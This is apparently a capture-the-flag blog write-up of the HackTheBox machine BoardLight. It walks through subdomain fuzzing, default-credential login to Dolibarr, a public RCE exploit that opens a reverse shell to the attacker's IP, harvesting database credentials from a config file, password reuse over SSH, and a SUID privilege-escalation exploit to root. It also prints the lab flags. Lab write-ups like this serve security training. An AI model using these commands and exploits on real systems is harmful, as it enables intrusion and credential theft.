---
layout: post
title: "HTB Linux Easy: BoardLight"
description: "BoardLight is an Easy rated Linux machine on HTB."
categories: [CTF,HTB]
tags: [Linux,Easy]
author: g
---

## Nmap Scan
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p 80 10.10.11.11
Starting Nmap 7.94SVN ( <https://nmap.org> ) at 2024-06-10 12:23 EDT
Nmap scan report for board.htb (10.10.11.11)
Host is up (0.035s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 9.33 seconds
```


## Enumerate HTTP (Port 80)

While enumerating for subdomains we come across: `crm.board.htb`.
```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/big.txt -H "Host: FUZZ.board.htb" -u <http://board.htb> -fs 15949

        /'___\\  /'___\\           /'___\\       
       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       
       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      
        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      
         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       
          \\/_/    \\/_/   \\/___/    \\/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : <http://board.htb>
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15949
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 283ms]
:: Progress: [20469/20469] :: Job [1/1] :: 200 req/sec :: Duration: [0:01:57] :: Errors: 0 ::
```

Add the entry to the hosts file.
```bash
┌──(kali㉿kali)-[~]
└─$ tail -n 1 /etc/hosts
10.10.11.11 board.htb crm.board.htb
```

Found the exact software and version running on the server: `Dolibarr 17.0.0`.
![Pasted image 20240715112244.png](/images/Pasted image 20240715112244.png){: .normal width="400"}

We are able to authenticate using `admin:admin`.
![Pasted image 20240715112240.png](/images/Pasted image 20240715112240.png){: .normal }

Found authenticated RCE PoC script for Dolibarr 17.0.0: [Link](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253).
```bash
┌──(kali㉿kali)-[~]
└─$ python3 exploit.py <http://crm.board.htb> admin admin 10.10.14.205 9001
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```

Gained shell connection.
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.205] from (UNKNOWN) [10.10.11.11] 43200
bash: cannot set terminal process group (856): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral movement
Found database credentials.
```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
```

Connect to DB using creds.
```bash
www-data@boardlight:~$ mysql -u dolibarrowner -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \\g.
Your MySQL connection id is 94
Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.

mysql> 
```

Hashes in the database proved to not be crackable, instead the DB password was used to SSH as the larissa user.
```bash
┌──(kali㉿kali)-[~]
└─$ ssh larissa@board.htb
larissa@board.htb's password: 
Last login: Mon Jun 10 10:07:56 2024 from 10.10.14.205
larissa@boardlight:~$ id
uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
```

User.txt: `3213b313bea243091459487b95520c12`
```bash
larissa@boardlight:~$ cat user.txt 
3213b313bea243091459487b95520c12
```


## Privilege Escalation
Find unknown SUID binaries using Linpeas.
```bash
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
```

Found PrivEsc PoC on GitHub for the elightenment binary: [Link](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh).
```bash
larissa@boardlight:/tmp$ ./priv.sh
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
```

Root.txt: `6abfae9e69e4d5d182e3b5c6f95b7f17`
```bash
# cat /root/root.txt
6abfae9e69e4d5d182e3b5c6f95b7f17
```

## PWNED!!!
![Pasted image 20240715112218.png](/images/Pasted image 20240715112218.png){: .normal }